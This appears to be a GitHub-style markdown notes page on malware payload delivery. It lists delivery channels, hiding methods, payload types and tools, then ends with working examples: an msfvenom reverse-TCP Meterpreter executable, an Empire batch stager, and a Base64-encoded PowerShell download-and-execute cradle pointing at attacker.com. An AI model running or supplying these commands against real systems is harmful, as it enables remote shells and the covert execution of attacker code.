# Payload Delivery Techniques

<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Payload-Code Execution-magenta?style=for-the-badge&logo=ghost&style&logoColor=yellow" width=40%></p>
---

``
Malware authors have a variety of techniques to deliver their malicious payloads to the victim. This document will cover some of the most common techniques used by malware authors to deliver their payloads
``


---
<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Payload-Challenges-orange?style=for-the-badge&logo=ghost&style&logoColor=red" width=50%></p>

---

- **Anti-Virus**: Anti-virus software is designed to detect and block malicious payloads. Malware authors have to find ways to bypass anti-virus software.
- **Firewall**: Firewalls are designed to block malicious payloads. Malware authors have to find ways to bypass firewalls.
- **User Interaction**: Malware authors have to find ways to trick the user into executing the payload.


---
<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Payload-Delivery-Green?style=for-the-badge&logo=ghost&style&logoColor=red" width=50%></p>

---

- **Email**: Malware authors can send the payload as an email attachment. The email can be sent directly to the victim or to a third party. The email can be sent from a compromised email account or from a fake email account.
- **Web**: Malware authors can host the payload on a website. The payload can be hosted on a compromised website or on a fake website.
- **USB**: Malware authors can deliver the payload via USB. The payload can be delivered via a USB drive or via a USB cable.
- **Network**: Malware authors can deliver the payload via a network. The payload can be delivered via a network cable or via a wireless network.
- **Physical Access**: Malware authors can deliver the payload via physical access. The payload can be delivered via a USB drive or via a USB cable.

### Hidden Payloads
Malware authors can hide the payload in a variety of ways, such as:

- **Steganography**: Malware authors can hide the payload in an image or in a video.
- **Encryption**: Malware authors can encrypt the payload.
- **Compression**: Malware authors can compress the payload.
- **Obfuscation**: Malware authors can obfuscate the payload.
- **Encoding**: Malware authors can encode the payload.
- **Packers**: Malware authors can use packers to hide the payload.
- **Virtual Machines**: Malware authors can use virtual machines to hide the payload.
- **Rootkits**: Malware authors can use rootkits to hide the payload.


---
<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Payload-Types-red?style=for-the-badge&logo=ghost&style&logoColor=yellow" width=50%></p>
---

- **Executable**: Malware authors can use an executable payload.
- **Script**: Malware authors can use a script payload.
- **Macro**: Malware authors can use a macro payload.
- **DLL**: Malware authors can use a DLL payload.
- **PDF**: Malware authors can use a PDF payload.
- **Office**: Malware authors can use an Office payload.
- **Archive**: Malware authors can use an archive payload.
- **Image**: Malware authors can use an image payload.
- **Video**: Malware authors can use a video payload.


---
<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Useful-Tools-yellow?style=for-the-badge&logo=ghost&style&logoColor=yellow" width=50%></p>
---


- **Metasploit**: Malware authors can use Metasploit to deliver the payload.
- **Empire**: Malware authors can use Empire to deliver the payload.
- **PowerShell**: Malware authors can use PowerShell to deliver the payload.
- **Python**: Malware authors can use Python to deliver the payload.

<p align=center href="http://findasnake.com"><img src="https://img.shields.io/badge/Payload-Generation-red?style=for-the-badge&logo=ghost&style&logoColor=red" width=50%></p>


``The first step is to generate the payload. The payload can be generated using a variety of tools, such as:``

---
 <img src="https://img.shields.io/badge/Example-Metasploit-yellow.svg?style=flat-square?style=plastic/"> 

### **Metasploit** Example:
---
```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe > payload.exe
```

---
 <img src="https://img.shields.io/badge/Example-Metasploit-yellow.svg?style=flat-square?style=plastic/"> 

### **Empire** Example:
------
```
usestager windows/launcher_bat
set Listener http
set OutFile payload.bat
execute
```
 <img src="https://img.shields.io/badge/Example-Metasploit-yellow.svg?style=flat-square?style=plastic/"> 

### **PowerShell** Example:

```powershell
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```


---
<p align=center> <img src="https://img.shields.io/badge/Murtadha Marzouq-blue.svg?style=flat-square?style=plastic&logo=apple" width=80%/> </p>

---

<p align=center><img src="https://avatars.githubusercontent.com/u/45076915?s=200&v=4" width="50%"> </p>

---
<p align=center><a href="findasnake.com"> <img src="https://img.shields.io/badge/Website-findasnake.com-green.svg?style=flat-square?style=plastic&logo=google" height=30 ></a></p>

<p align=center><a href="https://www.linkedin.com/in/murtadha-marzouq-61a2a3245/"> <img src="https://img.shields.io/badge/LinkedIn-Murtadha Marzouq-blue.svg?style=flat-square?style=plastic&logo=linkedin" height=30 ></a></p>


<p align=center><a href="https://github.com/MurtadhaM"> <img src="https://img.shields.io/badge/Github-Murtadha Marzouq-blue.svg?style=flat-square?style=plastic&logo=github" height=30 ></a></o>


